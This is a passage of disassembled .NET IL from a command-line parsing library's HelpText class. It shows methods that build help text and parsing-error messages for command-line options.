    IL_0025:  brtrue     IL_008a

    IL_002a:  ldarg.1
    IL_002b:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_0030:  ldarg.1
    IL_0031:  callvirt   instance class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::get_SentenceBuilder()
    IL_0036:  callvirt   instance string CommandLine.Text.BaseSentenceBuilder::get_ErrorsHeadingText()
    IL_003b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0040:  callvirt   instance void CommandLine.Text.HelpText::AddPreOptionsLine(string)
    IL_0045:  ldloc.0
    IL_0046:  ldc.i4.1
    IL_0047:  newarr     [mscorlib]System.String
    IL_004c:  stloc.1
    IL_004d:  ldloc.1
    IL_004e:  ldc.i4.0
    IL_004f:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_0054:  stelem     [mscorlib]System.String
    IL_0059:  ldloc.1
    IL_005a:  ldc.i4.0
    IL_005b:  callvirt   instance string[] [mscorlib]System.String::Split(string[],
                                                                          valuetype [mscorlib]System.StringSplitOptions)
    IL_0060:  stloc.2
    IL_0061:  ldloc.2
    IL_0062:  stloc.3
    IL_0063:  ldc.i4.0
    IL_0064:  stloc.s    V_4
    IL_0066:  br         IL_0083

    IL_006b:  ldloc.3
    IL_006c:  ldloc.s    V_4
    IL_006e:  ldelem     [mscorlib]System.String
    IL_0073:  stloc.s    V_5
    IL_0075:  ldarg.1
    IL_0076:  ldloc.s    V_5
    IL_0078:  callvirt   instance void CommandLine.Text.HelpText::AddPreOptionsLine(string)
    IL_007d:  ldloc.s    V_4
    IL_007f:  ldc.i4.1
    IL_0080:  add
    IL_0081:  stloc.s    V_4
    IL_0083:  ldloc.s    V_4
    IL_0085:  ldloc.3
    IL_0086:  ldlen
    IL_0087:  conv.i4
    IL_0088:  blt.s      IL_006b

    IL_008a:  ret
  } // end of method HelpText::DefaultParsingErrorsHandler

  .method public hidebysig specialname instance void 
          set_Heading(string 'value') cil managed
  {
    // Code size       19 (0x13)
    .maxstack  8
    IL_0000:  ldarg.1
    IL_0001:  ldstr      "value"
    IL_0006:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_000b:  ldarg.0
    IL_000c:  ldarg.1
    IL_000d:  stfld      string CommandLine.Text.HelpText::_heading
    IL_0012:  ret
  } // end of method HelpText::set_Heading

  .method public hidebysig specialname instance void 
          set_Copyright(string 'value') cil managed
  {
    // Code size       19 (0x13)
    .maxstack  8
    IL_0000:  ldarg.1
    IL_0001:  ldstr      "value"
    IL_0006:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_000b:  ldarg.0
    IL_000c:  ldarg.1
    IL_000d:  stfld      string CommandLine.Text.HelpText::_copyright
    IL_0012:  ret
  } // end of method HelpText::set_Copyright

  .method public hidebysig specialname instance int32 
          get_MaximumDisplayWidth() cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldflda     valuetype [mscorlib]System.Nullable`1<int32> CommandLine.Text.HelpText::_maximumDisplayWidth
    IL_0006:  call       instance bool valuetype [mscorlib]System.Nullable`1<int32>::get_HasValue()
    IL_000b:  brtrue     IL_0013

    IL_0010:  ldc.i4.s   80
    IL_0012:  ret

    IL_0013:  ldarg.0
    IL_0014:  ldflda     valuetype [mscorlib]System.Nullable`1<int32> CommandLine.Text.HelpText::_maximumDisplayWidth
    IL_0019:  call       instance !0 valuetype [mscorlib]System.Nullable`1<int32>::get_Value()
    IL_001e:  ret
  } // end of method HelpText::get_MaximumDisplayWidth

  .method public hidebysig specialname instance void 
          set_MaximumDisplayWidth(int32 'value') cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  newobj     instance void valuetype [mscorlib]System.Nullable`1<int32>::.ctor(!0)
    IL_0007:  stfld      valuetype [mscorlib]System.Nullable`1<int32> CommandLine.Text.HelpText::_maximumDisplayWidth
    IL_000c:  ret
  } // end of method HelpText::set_MaximumDisplayWidth

  .method public hidebysig specialname instance bool 
          get_AddDashesToOption() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.Text.HelpText::_addDashesToOption
    IL_0006:  ret
  } // end of method HelpText::get_AddDashesToOption

  .method public hidebysig specialname instance void 
          set_AddDashesToOption(bool 'value') cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool CommandLine.Text.HelpText::_addDashesToOption
    IL_0007:  ret
  } // end of method HelpText::set_AddDashesToOption

  .method public hidebysig specialname instance bool 
          get_AdditionalNewLineAfterOption() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      bool CommandLine.Text.HelpText::_additionalNewLineAfterOption
    IL_0006:  ret
  } // end of method HelpText::get_AdditionalNewLineAfterOption

  .method public hidebysig specialname instance void 
          set_AdditionalNewLineAfterOption(bool 'value') cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      bool CommandLine.Text.HelpText::_additionalNewLineAfterOption
    IL_0007:  ret
  } // end of method HelpText::set_AdditionalNewLineAfterOption

  .method public hidebysig specialname instance class CommandLine.Text.BaseSentenceBuilder 
          get_SentenceBuilder() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
    IL_0006:  ret
  } // end of method HelpText::get_SentenceBuilder

  .method public hidebysig instance void 
          AddPreOptionsLine(string 'value') cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.0
    IL_0003:  call       instance int32 CommandLine.Text.HelpText::get_MaximumDisplayWidth()
    IL_0008:  call       instance void CommandLine.Text.HelpText::AddPreOptionsLine(string,
                                                                                    int32)
    IL_000d:  ret
  } // end of method HelpText::AddPreOptionsLine

  .method private hidebysig instance void 
          AddPreOptionsLine(string 'value',
                            int32 maximumLength) cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_preOptionsHelp
    IL_0006:  ldarg.1
    IL_0007:  ldarg.2
    IL_0008:  call       void CommandLine.Text.HelpText::AddLine(class [mscorlib]System.Text.StringBuilder,
                                                                 string,
                                                                 int32)
    IL_000d:  ret
  } // end of method HelpText::AddPreOptionsLine

  .method public hidebysig instance void 
          AddPostOptionsLine(string 'value') cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.0
    IL_0002:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_postOptionsHelp
    IL_0007:  ldarg.1
    IL_0008:  call       instance void CommandLine.Text.HelpText::AddLine(class [mscorlib]System.Text.StringBuilder,
                                                                          string)
    IL_000d:  ret
  } // end of method HelpText::AddPostOptionsLine

  .method public hidebysig instance void 
          AddOptions(object options) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldsfld     string CommandLine.Text.HelpText::_defaultRequiredWord
    IL_0007:  call       instance void CommandLine.Text.HelpText::AddOptions(object,
                                                                             string)
    IL_000c:  ret
  } // end of method HelpText::AddOptions

  .method public hidebysig instance void 
          AddOptions(object options,
                     string requiredWord) cil managed
  {
    // Code size       37 (0x25)
    .maxstack  8
    IL_0000:  ldarg.1
    IL_0001:  ldstr      "options"
    IL_0006:  call       void CommandLine.Assumes::NotNull<object>(!!0,
                                                                   string)
    IL_000b:  ldarg.2
    IL_000c:  ldstr      "requiredWord"
    IL_0011:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0016:  ldarg.0
    IL_0017:  ldarg.1
    IL_0018:  ldarg.2
    IL_0019:  ldarg.0
    IL_001a:  call       instance int32 CommandLine.Text.HelpText::get_MaximumDisplayWidth()
    IL_001f:  call       instance void CommandLine.Text.HelpText::AddOptions(object,
                                                                             string,
                                                                             int32)
    IL_0024:  ret
  } // end of method HelpText::AddOptions

  .method public hidebysig instance void 
          AddOptions(object options,
                     string requiredWord,
                     int32 maximumLength) cil managed
  {
    // Code size       154 (0x9a)
    .maxstack  14
    .locals init ([0] class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.BaseOptionAttribute> V_0,
             [1] class CommandLine.HelpOptionAttribute V_1,
             [2] int32 V_2,
             [3] int32 V_3,
             [4] class [mscorlib]System.Collections.Generic.IEnumerator`1<class CommandLine.BaseOptionAttribute> V_4,
             [5] class CommandLine.BaseOptionAttribute V_5)
    IL_0000:  ldarg.1
    IL_0001:  ldstr      "options"
    IL_0006:  call       void CommandLine.Assumes::NotNull<object>(!!0,
                                                                   string)
    IL_000b:  ldarg.2
    IL_000c:  ldstr      "requiredWord"
    IL_0011:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0016:  ldarg.1
    IL_0017:  call       class [mscorlib]System.Collections.Generic.IList`1<!!0> CommandLine.ReflectionUtil::RetrievePropertyAttributeList<class CommandLine.BaseOptionAttribute>(object)
    IL_001c:  stloc.0
    IL_001d:  ldarg.1
    IL_001e:  call       !!0 CommandLine.ReflectionUtil::RetrieveMethodAttributeOnly<class CommandLine.HelpOptionAttribute>(object)
    IL_0023:  stloc.1
    IL_0024:  ldloc.1
    IL_0025:  brfalse    IL_0031

    IL_002a:  ldloc.0
    IL_002b:  ldloc.1
    IL_002c:  callvirt   instance void class [mscorlib]System.Collections.Generic.ICollection`1<class CommandLine.BaseOptionAttribute>::Add(!0)
    IL_0031:  ldloc.0
    IL_0032:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.ICollection`1<class CommandLine.BaseOptionAttribute>::get_Count()
    IL_0037:  brtrue     IL_003d

    IL_003c:  ret

    IL_003d:  ldarg.0
    IL_003e:  ldloc.0
    IL_003f:  call       instance int32 CommandLine.Text.HelpText::GetMaxLength(class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.BaseOptionAttribute>)
    IL_0044:  stloc.2
    IL_0045:  ldarg.0
    IL_0046:  ldc.i4     0x80
    IL_004b:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_0050:  stfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_0055:  ldarg.3
    IL_0056:  ldloc.2
    IL_0057:  ldc.i4.6
    IL_0058:  add
    IL_0059:  sub
    IL_005a:  stloc.3
    IL_005b:  ldloc.0
    IL_005c:  callvirt   instance class [mscorlib]System.Collections.Generic.IEnumerator`1<!0> class [mscorlib]System.Collections.Generic.IEnumerable`1<class CommandLine.BaseOptionAttribute>::GetEnumerator()
    IL_0061:  stloc.s    V_4
    .try
    {
      IL_0063:  br         IL_007c

      IL_0068:  ldloc.s    V_4
      IL_006a:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IEnumerator`1<class CommandLine.BaseOptionAttribute>::get_Current()
      IL_006f:  stloc.s    V_5
      IL_0071:  ldarg.0
      IL_0072:  ldarg.2
      IL_0073:  ldloc.2
      IL_0074:  ldloc.s    V_5
      IL_0076:  ldloc.3
      IL_0077:  call       instance void CommandLine.Text.HelpText::AddOption(string,
                                                                              int32,
                                                                              class CommandLine.BaseOptionAttribute,
                                                                              int32)
      IL_007c:  ldloc.s    V_4
      IL_007e:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_0083:  brtrue.s   IL_0068

      IL_0085:  leave      IL_0099

    }  // end .try
    finally
    {
      IL_008a:  ldloc.s    V_4
      IL_008c:  brfalse    IL_0098

      IL_0091:  ldloc.s    V_4
      IL_0093:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0098:  endfinally
    }  // end handler
    IL_0099:  ret
  } // end of method HelpText::AddOptions

  .method public hidebysig instance string 
          RenderParsingErrorsText(class CommandLine.CommandLineOptionsBase options,
                                  int32 indent) cil managed
  {
    // Code size       469 (0x1d5)
    .maxstack  55
    .locals init ([0] class [mscorlib]System.Text.StringBuilder V_0,
             [1] valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<class CommandLine.ParsingError> V_1,
             [2] class CommandLine.ParsingError V_2,
             [3] class [mscorlib]System.Text.StringBuilder V_3)
    IL_0000:  ldarg.1
    IL_0001:  callvirt   instance class CommandLine.PostParsingState CommandLine.CommandLineOptionsBase::get_InternalLastPostParsingState()
    IL_0006:  callvirt   instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.PostParsingState::get_Errors()
    IL_000b:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>::get_Count()
    IL_0010:  brtrue     IL_001b

    IL_0015:  ldsfld     string [mscorlib]System.String::Empty
    IL_001a:  ret

    IL_001b:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
    IL_0020:  stloc.0
    IL_0021:  ldarg.1
    IL_0022:  callvirt   instance class CommandLine.PostParsingState CommandLine.CommandLineOptionsBase::get_InternalLastPostParsingState()
    IL_0027:  callvirt   instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.PostParsingState::get_Errors()
    IL_002c:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>::GetEnumerator()
    IL_0031:  stloc.1
    .try
    {
      IL_0032:  br         IL_01af

      IL_0037:  ldloca.s   V_1
      IL_0039:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<class CommandLine.ParsingError>::get_Current()
      IL_003e:  stloc.2
      IL_003f:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0044:  stloc.3
      IL_0045:  ldloc.3
      IL_0046:  ldarg.2
      IL_0047:  call       string CommandLine.StringUtil::Spaces(int32)
      IL_004c:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_0051:  pop
      IL_0052:  ldloc.2
      IL_0053:  callvirt   instance class CommandLine.BadOptionInfo CommandLine.ParsingError::get_BadOption()
      IL_0058:  callvirt   instance string CommandLine.BadOptionInfo::get_ShortName()
      IL_005d:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
      IL_0062:  brtrue     IL_00a0

      IL_0067:  ldloc.3
      IL_0068:  ldc.i4.s   45
      IL_006a:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(char)
      IL_006f:  pop
      IL_0070:  ldloc.3
      IL_0071:  ldloc.2
      IL_0072:  callvirt   instance class CommandLine.BadOptionInfo CommandLine.ParsingError::get_BadOption()
      IL_0077:  callvirt   instance string CommandLine.BadOptionInfo::get_ShortName()
      IL_007c:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_0081:  pop
      IL_0082:  ldloc.2
      IL_0083:  callvirt   instance class CommandLine.BadOptionInfo CommandLine.ParsingError::get_BadOption()
      IL_0088:  callvirt   instance string CommandLine.BadOptionInfo::get_LongName()
      IL_008d:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
      IL_0092:  brtrue     IL_00a0

      IL_0097:  ldloc.3
      IL_0098:  ldc.i4.s   47
      IL_009a:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(char)
      IL_009f:  pop
      IL_00a0:  ldloc.2
      IL_00a1:  callvirt   instance class CommandLine.BadOptionInfo CommandLine.ParsingError::get_BadOption()
      IL_00a6:  callvirt   instance string CommandLine.BadOptionInfo::get_LongName()
      IL_00ab:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
      IL_00b0:  brtrue     IL_00d3

      IL_00b5:  ldloc.3
      IL_00b6:  ldstr      "--"
      IL_00bb:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_00c0:  pop
      IL_00c1:  ldloc.3
      IL_00c2:  ldloc.2
      IL_00c3:  callvirt   instance class CommandLine.BadOptionInfo CommandLine.ParsingError::get_BadOption()
      IL_00c8:  callvirt   instance string CommandLine.BadOptionInfo::get_LongName()
      IL_00cd:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_00d2:  pop
      IL_00d3:  ldloc.3
      IL_00d4:  ldstr      " "
      IL_00d9:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_00de:  pop
      IL_00df:  ldloc.2
      IL_00e0:  callvirt   instance bool CommandLine.ParsingError::get_ViolatesRequired()
      IL_00e5:  brfalse    IL_0101

      IL_00ea:  ldloc.3
      IL_00eb:  ldarg.0
      IL_00ec:  ldfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
      IL_00f1:  callvirt   instance string CommandLine.Text.BaseSentenceBuilder::get_RequiredOptionMissingText()
      IL_00f6:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_00fb:  pop
      IL_00fc:  br         IL_0113

      IL_0101:  ldloc.3
      IL_0102:  ldarg.0
      IL_0103:  ldfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
      IL_0108:  callvirt   instance string CommandLine.Text.BaseSentenceBuilder::get_OptionWord()
      IL_010d:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_0112:  pop
      IL_0113:  ldloc.2
      IL_0114:  callvirt   instance bool CommandLine.ParsingError::get_ViolatesFormat()
      IL_0119:  brfalse    IL_013c

      IL_011e:  ldloc.3
      IL_011f:  ldstr      " "
      IL_0124:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_0129:  pop
      IL_012a:  ldloc.3
      IL_012b:  ldarg.0
      IL_012c:  ldfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
      IL_0131:  callvirt   instance string CommandLine.Text.BaseSentenceBuilder::get_ViolatesFormatText()
      IL_0136:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_013b:  pop
      IL_013c:  ldloc.2
      IL_013d:  callvirt   instance bool CommandLine.ParsingError::get_ViolatesMutualExclusiveness()
      IL_0142:  brfalse    IL_0199

      IL_0147:  ldloc.2
      IL_0148:  callvirt   instance bool CommandLine.ParsingError::get_ViolatesFormat()
      IL_014d:  brtrue     IL_015d

      IL_0152:  ldloc.2
      IL_0153:  callvirt   instance bool CommandLine.ParsingError::get_ViolatesRequired()
      IL_0158:  brfalse    IL_017b

      IL_015d:  ldloc.3
      IL_015e:  ldstr      " "
      IL_0163:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_0168:  pop
      IL_0169:  ldloc.3
      IL_016a:  ldarg.0
      IL_016b:  ldfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
      IL_0170:  callvirt   instance string CommandLine.Text.BaseSentenceBuilder::get_AndWord()
      IL_0175:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_017a:  pop
      IL_017b:  ldloc.3
      IL_017c:  ldstr      " "
      IL_0181:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_0186:  pop
      IL_0187:  ldloc.3
      IL_0188:  ldarg.0
      IL_0189:  ldfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
      IL_018e:  callvirt   instance string CommandLine.Text.BaseSentenceBuilder::get_ViolatesMutualExclusivenessText()
      IL_0193:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
      IL_0198:  pop
      IL_0199:  ldloc.3
      IL_019a:  ldc.i4.s   46
      IL_019c:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(char)
      IL_01a1:  pop
      IL_01a2:  ldloc.0
      IL_01a3:  ldloc.3
      IL_01a4:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_01a9:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::AppendLine(string)
      IL_01ae:  pop
      IL_01af:  ldloca.s   V_1
      IL_01b1:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<class CommandLine.ParsingError>::MoveNext()
      IL_01b6:  brtrue     IL_0037

      IL_01bb:  leave      IL_01ce

    }  // end .try
    finally
    {
      IL_01c0:  ldloca.s   V_1
      IL_01c2:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<class CommandLine.ParsingError>
      IL_01c8:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_01cd:  endfinally
    }  // end handler
    IL_01ce:  ldloc.0
    IL_01cf:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_01d4:  ret
  } // end of method HelpText::RenderParsingErrorsText

  .method private hidebysig instance void 
          AddOption(string requiredWord,
                    int32 maxLength,
                    class CommandLine.BaseOptionAttribute option,
                    int32 widthOfHelpText) cil managed
  {
    // Code size       714 (0x2ca)
    .maxstack  61
    .locals init ([0] class [mscorlib]System.Text.StringBuilder V_0,
             [1] class CommandLine.Text.FormatOptionHelpTextEventArgs V_1,
             [2] int32 V_2,
             [3] char[] V_3,
             [4] string[] V_4,
             [5] int32 V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_0006:  ldstr      "  "
    IL_000b:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0010:  pop
    IL_0011:  ldarg.2
    IL_0012:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_0017:  stloc.0
    IL_0018:  ldarg.3
    IL_0019:  callvirt   instance bool CommandLine.BaseOptionAttribute::get_HasShortName()
    IL_001e:  brfalse    IL_0060

    IL_0023:  ldarg.0
    IL_0024:  ldfld      bool CommandLine.Text.HelpText::_addDashesToOption
    IL_0029:  brfalse    IL_0037

    IL_002e:  ldloc.0
    IL_002f:  ldc.i4.s   45
    IL_0031:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(char)
    IL_0036:  pop
    IL_0037:  ldloc.0
    IL_0038:  ldstr      "{0}"
    IL_003d:  ldarg.3
    IL_003e:  callvirt   instance string CommandLine.BaseOptionAttribute::get_ShortName()
    IL_0043:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::AppendFormat(string,
                                                                                                                              object)
    IL_0048:  pop
    IL_0049:  ldarg.3
    IL_004a:  callvirt   instance bool CommandLine.BaseOptionAttribute::get_HasLongName()
    IL_004f:  brfalse    IL_0060

    IL_0054:  ldloc.0
    IL_0055:  ldstr      ", "
    IL_005a:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_005f:  pop
    IL_0060:  ldarg.3
    IL_0061:  callvirt   instance bool CommandLine.BaseOptionAttribute::get_HasLongName()
    IL_0066:  brfalse    IL_0094

    IL_006b:  ldarg.0
    IL_006c:  ldfld      bool CommandLine.Text.HelpText::_addDashesToOption
    IL_0071:  brfalse    IL_0082

    IL_0076:  ldloc.0
    IL_0077:  ldstr      "--"
    IL_007c:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0081:  pop
    IL_0082:  ldloc.0
    IL_0083:  ldstr      "{0}"
    IL_0088:  ldarg.3
    IL_0089:  callvirt   instance string CommandLine.BaseOptionAttribute::get_LongName()
    IL_008e:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::AppendFormat(string,
                                                                                                                              object)
    IL_0093:  pop
    IL_0094:  ldloc.0
    IL_0095:  callvirt   instance int32 [mscorlib]System.Text.StringBuilder::get_Length()
    IL_009a:  ldarg.2
    IL_009b:  bge        IL_00bd

    IL_00a0:  ldarg.0
    IL_00a1:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_00a6:  ldloc.0
    IL_00a7:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_00ac:  ldarg.2
    IL_00ad:  callvirt   instance string [mscorlib]System.String::PadRight(int32)
    IL_00b2:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_00b7:  pop
    IL_00b8:  br         IL_00cf

    IL_00bd:  ldarg.0
    IL_00be:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_00c3:  ldloc.0
    IL_00c4:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_00c9:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_00ce:  pop
    IL_00cf:  ldarg.0
    IL_00d0:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_00d5:  ldstr      "    "
    IL_00da:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_00df:  pop
    IL_00e0:  ldarg.3
    IL_00e1:  callvirt   instance bool CommandLine.BaseOptionAttribute::get_Required()
    IL_00e6:  brfalse    IL_0107

    IL_00eb:  ldarg.3
    IL_00ec:  ldstr      "{0} "
    IL_00f1:  ldarg.1
    IL_00f2:  call       string [mscorlib]System.String::Format(string,
                                                                object)
    IL_00f7:  ldarg.3
    IL_00f8:  callvirt   instance string CommandLine.BaseOptionAttribute::get_HelpText()
    IL_00fd:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0102:  callvirt   instance void CommandLine.BaseOptionAttribute::set_HelpText(string)
    IL_0107:  ldarg.3
    IL_0108:  newobj     instance void CommandLine.Text.FormatOptionHelpTextEventArgs::.ctor(class CommandLine.BaseOptionAttribute)
    IL_010d:  stloc.1
    IL_010e:  ldarg.0
    IL_010f:  ldloc.1
    IL_0110:  callvirt   instance void CommandLine.Text.HelpText::OnFormatOptionHelpText(class CommandLine.Text.FormatOptionHelpTextEventArgs)
    IL_0115:  ldarg.3
    IL_0116:  ldloc.1
    IL_0117:  callvirt   instance class CommandLine.BaseOptionAttribute CommandLine.Text.FormatOptionHelpTextEventArgs::get_Option()
    IL_011c:  callvirt   instance string CommandLine.BaseOptionAttribute::get_HelpText()
    IL_0121:  callvirt   instance void CommandLine.BaseOptionAttribute::set_HelpText(string)
    IL_0126:  ldarg.3
    IL_0127:  callvirt   instance string CommandLine.BaseOptionAttribute::get_HelpText()
    IL_012c:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0131:  brtrue     IL_028a

    IL_0136:  ldc.i4.0
    IL_0137:  stloc.2
    IL_0138:  ldarg.3
    IL_0139:  callvirt   instance string CommandLine.BaseOptionAttribute::get_HelpText()
    IL_013e:  ldc.i4.1
    IL_013f:  newarr     [mscorlib]System.Char
    IL_0144:  stloc.3
    IL_0145:  ldloc.3
    IL_0146:  ldc.i4.0
    IL_0147:  ldc.i4.s   32
    IL_0149:  stelem.i2
    IL_014a:  ldloc.3
    IL_014b:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
    IL_0150:  stloc.s    V_4
    IL_0152:  ldc.i4.0
    IL_0153:  stloc.s    V_5
    IL_0155:  br         IL_020e

    IL_015a:  ldloc.s    V_4
    IL_015c:  ldloc.s    V_5
    IL_015e:  ldelem     [mscorlib]System.String
    IL_0163:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0168:  ldarg.s    widthOfHelpText
    IL_016a:  ldloc.2
    IL_016b:  sub
    IL_016c:  bge        IL_01c8

    IL_0171:  ldarg.0
    IL_0172:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_0177:  ldloc.s    V_4
    IL_0179:  ldloc.s    V_5
    IL_017b:  ldelem     [mscorlib]System.String
    IL_0180:  callvirt   instance class [mscorlib]System.Text.StringBuilder [mscorlib]System.Text.StringBuilder::Append(string)
    IL_0185:  pop
    IL_0186:  ldloc.2
    IL_0187:  ldloc.s    V_4
    IL_0189:  ldloc.s    V_5
    IL_018b:  ldelem     [mscorlib]System.String
    IL_0190:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0195:  add
    IL_0196:  stloc.2
    IL_0197:  ldarg.s    widthOfHelpText
    IL_0199:  ldloc.2
    IL_019a:  sub
    IL_019b:  ldc.i4.1
    IL_019c:  ble        IL_0208

    IL_01a1:  ldloc.s    V_5
    IL_01a3:  ldloc.s    V_4
    IL_01a5:  ldlen
    IL_01a6:  conv.i4
    IL_01a7:  ldc.i4.1
    IL_01a8:  sub
    IL_01a9:  beq        IL_0208

    IL_01ae:  ldarg.0
    IL_01af:  ldfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_optionsHelp
    IL_01b4:  ldstr      " "
